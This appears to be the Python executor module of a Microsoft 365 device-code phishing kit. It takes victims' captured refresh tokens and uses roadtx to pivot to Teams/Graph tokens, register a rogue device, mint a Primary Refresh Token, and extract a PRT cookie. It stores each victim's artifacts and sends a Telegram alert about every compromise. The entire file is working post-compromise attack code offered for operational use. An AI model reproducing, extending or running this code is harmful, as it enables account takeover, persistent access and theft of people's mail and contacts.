# ─ executor.py ───────────────────────────────────────────
import os
import json
import base64
import datetime
import subprocess
import logging
import threading
import db

logger = logging.getLogger(__name__)
VICTIMS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'victims')


def _decode_jwt(token):
    """Decode JWT payload without verifying signature."""
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (-len(payload) % 4)
            return json.loads(base64.urlsafe_b64decode(payload).decode('utf-8'))
    except Exception:
        pass
    return {}


def _roadtx_expiry():
    """Return an expiresOn string in the format roadtx uses: 'YYYY-MM-DD HH:MM:SS'."""
    future = datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    return future.strftime('%Y-%m-%d %H:%M:%S')


def run_roadtx(args, victim_path, log_stdout=True):
    """Execute a roadtx command within the isolated victim directory.

    All file paths are passed via per-subcommand flags so roadtx never
    touches system-level paths.  cwd=victim_path keeps any relative-path
    fallbacks inside the victim folder too.

    Set log_stdout=False for commands whose stdout contains sensitive
    material (e.g. the raw PRT from `roadtx prt`).
    """
    os.makedirs(victim_path, exist_ok=True)
    cmd = ['roadtx'] + args
    logger.info(f"Running: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            cwd=victim_path
        )
        logger.info(f"Success. Output length: {len(result.stdout)}")
        if log_stdout and result.stdout.strip():
            logger.info(f"STDOUT: {result.stdout.strip()}")
        return result.stdout
    except FileNotFoundError:
        logger.error("CRITICAL: roadtx not found. Ensure it is installed and in PATH.")
        return None
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed (Code {e.returncode})")
        logger.error(f"STDOUT: {e.stdout}")
        logger.error(f"STDERR: {e.stderr}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        return None


def refresh_via_prt(user_code):
    """Re-derive a fresh Teams-scoped Graph access token from the victim's PRT.

    Uses `roadtx prtauth -c msteams -r https://graph.microsoft.com` — the same
    command as executor Step 5 — to produce a token that works for all Graph
    Mail/Contacts operations.

    Returns:
        (True, access_token, expiry_unix)  on success
        (False, None, None)                on any failure

    NOTE: This intentionally has NO fallback to oauth.refresh_access_token().
    A Broker-scoped token produced by the standard RT grant breaks mailbox
    access and is therefore worse than doing nothing.
    """
    victim_path = os.path.join(VICTIMS_DIR, user_code)
    prt_file    = os.path.join(victim_path, 'roadtx.prt')
    auth_file   = os.path.join(victim_path, '.roadtools_auth')

    if not os.path.exists(prt_file):
        logger.warning(f"[PRT-REFRESH] {user_code}: roadtx.prt not found — "
                       "post-compromise chain has not been run for this session.")
        return False, None, None

    logger.info(f"[PRT-REFRESH] {user_code}: Refreshing via PRT (msteams client, graph.microsoft.com resource).")
    out = run_roadtx([
        'prtauth',
        '-f', prt_file,
        '--tokenfile', auth_file,
        '-c', 'msteams',
        '-r', 'https://graph.microsoft.com',
    ], victim_path)

    if not out:
        logger.error(f"[PRT-REFRESH] {user_code}: roadtx prtauth command failed.")
        return False, None, None

    try:
        with open(auth_file, 'r', encoding='utf-8') as _f:
            _auth = json.load(_f)
        new_at = _auth.get('accessToken')
        if not new_at:
            logger.error(f"[PRT-REFRESH] {user_code}: accessToken missing from .roadtools_auth after prtauth.")
            return False, None, None

        claims  = _decode_jwt(new_at)
        expiry  = claims.get('exp', 0)
        if not expiry:
            expiry = int(__import__('time').time()) + 3600

        db.update_session_refreshed_token(user_code, new_at, expiry)
        logger.info(f"[PRT-REFRESH] {user_code}: ✓ Teams-scoped token refreshed successfully (exp={expiry}).")
        return True, new_at, expiry

    except Exception as e:
        logger.error(f"[PRT-REFRESH] {user_code}: Failed to read auth file after prtauth: {e}")
        return False, None, None


def _finalize_and_alert(user_code, teams_token, prt_cookie):
    """Save artifacts to db and fire single comprehensive Telegram alert."""
    try:
        db.update_session_artifacts(user_code, teams_token, prt_cookie)
    except Exception as e:
        logger.error(f"Error updating session artifacts: {e}")

    try:
        from main import dispatch_victim_compromised_alert
        threading.Thread(
            target=dispatch_victim_compromised_alert,
            args=(user_code,),
            daemon=True
        ).start()
    except Exception as _e:
        logger.error(f"Failed to dispatch final victim alert: {_e}")


ACTIVE_CHAINS = set()
_CHAIN_LOCK = threading.Lock()


def is_chain_running(user_code):
    """Check if the post-compromise device registration & PRT chain is currently running."""
    return user_code in ACTIVE_CHAINS


def is_prt_ready(user_code):
    """Check if roadtx.prt exists on disk for this victim session."""
    victim_path = os.path.join(VICTIMS_DIR, user_code)
    prt_file = os.path.join(victim_path, 'roadtx.prt')
    return os.path.exists(prt_file)


def execute_post_compromise(user_code):
    """Run the full automated post-compromise chain for a captured victim.
    Duplicate invocations (concurrent poller threads seeing SUCCESS) are
    skipped — two racing chains corrupt each other's device certs and
    Step 4 PRT generation fails with AADSTS501209."""
    with _CHAIN_LOCK:
        if user_code in ACTIVE_CHAINS:
            logger.info(f"[EXECUTOR] Chain already running for {user_code} — skipping duplicate.")
            return
        ACTIVE_CHAINS.add(user_code)
    try:
        _run_post_compromise_chain(user_code)
    finally:
        ACTIVE_CHAINS.discard(user_code)


def _run_post_compromise_chain(user_code):
    session = db.get_session_by_user_code(user_code)
    if not session or session['status'] != 'CAPTURED':
        logger.warning(f"Session {user_code} is not ready for post-compromise.")
        return

    # All victim artifacts live exclusively under this directory
    victim_path = os.path.join(VICTIMS_DIR, user_code)
    os.makedirs(victim_path, exist_ok=True)

    rt        = session['refresh_token']
    at        = session['access_token']
    client_id = session.get('client_id', '29d9ed98-a469-4536-ade2-f981bc1d605e')
    email     = session['victim_email'] or user_code

    # Extract tenantId from the captured access token JWT
    jwt_claims = _decode_jwt(at)
    tenant_id  = jwt_claims.get('tid', 'common')

    # Sanitize device name from the local-part of the email
    device_name = (
        email.split('@')[0]
        .replace('.', '_')
        .replace('-', '_')
        .replace(' ', '_')
    )

    # ── All file paths pinned to victim_path ────────────────────
    auth_file = os.path.join(victim_path, '.roadtools_auth')
    pem_file  = os.path.join(victim_path, f"{device_name}.pem")
    key_file  = os.path.join(victim_path, f"{device_name}.key")
    prt_file  = os.path.join(victim_path, 'roadtx.prt')

    logger.info("=" * 60)
    logger.info(f"[EXECUTOR] Starting chain for {user_code} ({email})")
    logger.info(f"[EXECUTOR] Tenant: {tenant_id}  |  Device: {device_name}")
    logger.info(f"[EXECUTOR] Victim dir: {victim_path}")
    logger.info("=" * 60)

    # ── INITIALIZATION ──────────────────────────────────────────
    # Seed .roadtools_auth using the EXACT key names and date format that
    # roadtx produces itself, so subsequent commands parse it correctly.
    #   - Key is "_clientId" (underscore prefix), not "clientId"
    #   - "expiresOn" is space-formatted: "YYYY-MM-DD HH:MM:SS"
    auth_data = {
        'tokenType':    'Bearer',
        'expiresOn':    _roadtx_expiry(),
        'tenantId':     tenant_id,
        '_clientId':    client_id,
        'accessToken':  at,
        'refreshToken': rt,
    }
    with open(auth_file, 'w') as f:
        json.dump(auth_data, f)
    logger.info(f"Seeded auth file: {auth_file}  (tenant={tenant_id})")

    teams_token_acquired = None

    # ── STEP 1: FOCI Refresh Token Pivot ────────────────────────
    # Attempt to exchange the captured refresh token for a Teams/Graph token
    # directly via FOCI.  Many consumer app tokens support this; it is a fast
    # path that skips the full PRT chain.
    # --tokenfile keeps all reads/writes inside the victim folder.
    logger.info("[STEP 1] FOCI Refresh Token Pivot")
    step1_out = run_roadtx([
        'refreshtokento',
        '--tokenfile', auth_file,
        '-c', 'msteams',
        '-r', 'msgraph',
    ], victim_path)

    if step1_out:
        logger.info("✓ Step 1 SUCCESS: Teams token acquired via FOCI pivot.")
        # roadtx overwrites the auth file with the msgraph-audience token.
        # Read the ACCESS TOKEN from it — the raw stdout contains log lines
        # ('Requesting token for resource...', 'Tokens were written to...')
        # which corrupt the Bearer header if stored as-is.
        try:
            with open(auth_file, 'r') as _af:
                _auth_data = json.load(_af)
            teams_token_acquired = _auth_data.get('accessToken') or _auth_data.get('access_token') or step1_out
        except Exception as _e:
            logger.warning(f"Could not re-read auth file for msgraph token: {_e}")
            teams_token_acquired = None
    else:
        logger.warning("✗ Step 1 FAILED: Not FOCI-compatible. Continuing via PRT chain.")

    # After Step 1 the auth file may have been overwritten with a msgraph
    # token.  Re-seed with the original refresh token so Step 2 (DRS
    # exchange) still has a valid RT to work with.
    with open(auth_file, 'w') as f:
        json.dump(auth_data, f)
    logger.info("Re-seeded auth file with original RT before DRS exchange.")

    # ── PERSONAL ACCOUNTS: skip device-registration steps ────────
    # Consumer accounts (outlook.com, live.com) have no Azure AD device
    # registration — PRT generation cannot succeed. The captured tokens
    # (and the Step 1 FOCI pivot if it worked) ARE the prize.
    if (session.get('account_type') or 'work') == 'personal':
        logger.info("[PERSONAL] Consumer account — skipping Steps 2-4 (no device registration / PRT).")
        # The FOCI pivot produced an msgraph-audience token — use it to fetch
        # the victim's profile (the original v1 token's audience is
        # graph.windows.net, which MS Graph rejects) so the dashboard shows
        # the victim's name/email.
        if teams_token_acquired:
            try:
                import graph as _graph
                profile = _graph.get_user_profile(teams_token_acquired)
                if profile and 'error' not in profile:
                    v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
                    v_name = profile.get('displayName') or 'Unknown'
                    v_role = profile.get('jobTitle') or ''
                    db.update_session_profile(user_code, v_name, v_email, v_role or 'User')
                    logger.info(f"[PERSONAL] Profile resolved via FOCI token: {v_name} <{v_email}>")
            except Exception as e:
                logger.warning(f"[PERSONAL] Profile lookup via FOCI token failed: {e}")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return

    # ── STEP 2: DRS Token Acquisition ──────────────────────────
    # roadtx refreshtokento reads the refreshToken from auth_file, requests
    # a DRS-audience access token, then OVERWRITES auth_file with the new
    # DRS accessToken.  Step 3 then reads it from there.
    logger.info("[STEP 2] DRS Token Acquisition")
    drs_out = run_roadtx([
        'refreshtokento',
        '--tokenfile', auth_file,
        '-r', 'drs',
    ], victim_path)

    if not drs_out:
        logger.error("✗ Step 2 FAILED: DRS token not acquired. Aborting chain.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return
    logger.info("✓ Step 2 SUCCESS: DRS token written to victim auth file.")

    # ── STEP 3: Device Registration ─────────────────────────────
    # roadtx device register reads the DRS accessToken from auth_file
    # (no --access-token flag needed - it reads it naturally).
    # -c / -k pin the output cert and key to the victim folder explicitly.
    logger.info(f"[STEP 3] Device Registration (Name: {device_name})")
    reg_out = run_roadtx([
        'device',
        '-a', 'register',
        '-n', device_name,
        '-c', pem_file,
        '-k', key_file,
    ], victim_path)

    if not reg_out:
        logger.error("✗ Step 3 FAILED: Device registration command failed. Aborting.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return

    if not (os.path.exists(pem_file) and os.path.exists(key_file)):
        dir_contents = os.listdir(victim_path)
        logger.error(
            f"✗ Step 3 FAILED: Cert files not found after registration.\n"
            f"  Expected : {pem_file}\n"
            f"           : {key_file}\n"
            f"  Dir      : {dir_contents}"
        )
        db.update_session_artifacts(user_code, teams_token_acquired, None)
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return
    logger.info(f"✓ Step 3 SUCCESS: Device registered. Certs saved to victim folder.")

    # ── STEP 4: PRT Generation ──────────────────────────────────
    # --refresh-token file  → read the RT from auth_file (the word "file"
    #                          is a roadtx keyword, not a path)
    # -c / -k              → victim device cert and key
    # -f                   → write roadtx.prt into the victim folder
    #
    # log_stdout=False because roadtx prints the raw PRT to stdout and we
    # must NOT log sensitive key material.
    logger.info("[STEP 4] PRT Generation")
    prt_out = run_roadtx([
        'prt',
        '--refresh-token', 'file',
        '-c', pem_file,
        '-k', key_file,
        '-f', prt_file,
    ], victim_path, log_stdout=False)

    if not prt_out:
        logger.error("✗ Step 4 FAILED: PRT generation command failed. Aborting.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return

    if not os.path.exists(prt_file):
        logger.error(f"✗ Step 4 FAILED: {prt_file} not found after prt command.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return
    logger.info(f"✓ Step 4 SUCCESS: PRT saved to victim folder.")

    # ── STEP 5: PRT-Based Teams Token Acquisition (fallback) ────
    # -f           → read PRT from victim folder (not system default)
    # --tokenfile  → write resulting token into victim auth file
    # -r           → full URL (not alias) as proven to work in manual test
    if not teams_token_acquired:
        logger.info("[STEP 5] PRT-Based Teams Token Acquisition")
        step5_out = run_roadtx([
            'prtauth',
            '-f', prt_file,
            '--tokenfile', auth_file,
            '-c', 'msteams',
            '-r', 'https://graph.microsoft.com',
        ], victim_path)

        if step5_out:
            # prtauth writes the token to auth_file and only prints a log
            # message to stdout.  Read the real accessToken from the file.
            try:
                with open(auth_file) as _f:
                    _auth = json.load(_f)
                teams_token_acquired = _auth.get('accessToken')
                if teams_token_acquired:
                    logger.info("✓ Step 5 SUCCESS: Teams access token read from victim auth file.")
                    # Also update the session's primary access_token so the
                    # graph proxy can use it immediately without a refresh.
                    at_claims = _decode_jwt(teams_token_acquired)
                    db.update_session_refreshed_token(
                        user_code, teams_token_acquired,
                        at_claims.get('exp', 0)
                    )
                else:
                    logger.error("✗ Step 5 FAILED: accessToken missing from auth file after prtauth.")
            except Exception as _e:
                logger.error(f"✗ Step 5 FAILED: Could not read auth file after prtauth: {_e}")
        else:
            logger.error("✗ Step 5 FAILED: Could not acquire Teams token via PRT.")
    else:
        # FOCI token acquired in Step 1 is raw stdout — read the real JWT
        # from the auth file that refreshtokento wrote during Step 1.
        # NOTE: auth_file was re-seeded before Step 2, so if Step 1 succeeded
        # the token is already in teams_token_acquired as the stdout payload.
        # For safety, try to parse it as the auth file JSON.
        try:
            _tok_data = json.loads(teams_token_acquired)
            if isinstance(_tok_data, dict) and 'accessToken' in _tok_data:
                teams_token_acquired = _tok_data['accessToken']
        except (json.JSONDecodeError, TypeError):
            pass  # already a raw JWT string from a prior run, keep as-is
        logger.info("[STEP 5] SKIPPED: Teams token already acquired in Step 1.")

    # ── STEP 6: PRT Cookie Extraction ───────────────────────────
    # -f → read PRT from victim folder.
    # roadtx stdout format:
    #   "PRT cookie: <JWT>\nCan be used in external browsers..."
    # We extract just the JWT value and discard the surrounding text.
    logger.info("[STEP 6] PRT Cookie Extraction")
    prt_cookie_raw = run_roadtx([
        'prtcookie',
        '-f', prt_file,
    ], victim_path)

    prt_cookie_out = None
    if prt_cookie_raw:
        for line in prt_cookie_raw.splitlines():
            line = line.strip()
            if line.startswith('PRT cookie:'):
                prt_cookie_out = line.replace('PRT cookie:', '').strip()
                break
        if prt_cookie_out:
            logger.info("✓ Step 6 SUCCESS: PRT cookie extracted (JWT only).")
        else:
            logger.warning("⚠ Step 6: Command succeeded but could not parse cookie from output.")
            logger.warning(f"Raw output: {prt_cookie_raw[:200]}")
    else:
        logger.error("✗ Step 6 FAILED: PRT cookie not extracted.")

    # ── FINALIZATION & SINGLE RICH TELEGRAM ALERT ────────────────
    _finalize_and_alert(user_code, teams_token_acquired, prt_cookie_out)
    logger.info("=" * 60)
    logger.info(f"[EXECUTOR] Chain completed for {user_code}. Artifacts saved.")
    logger.info("=" * 60)
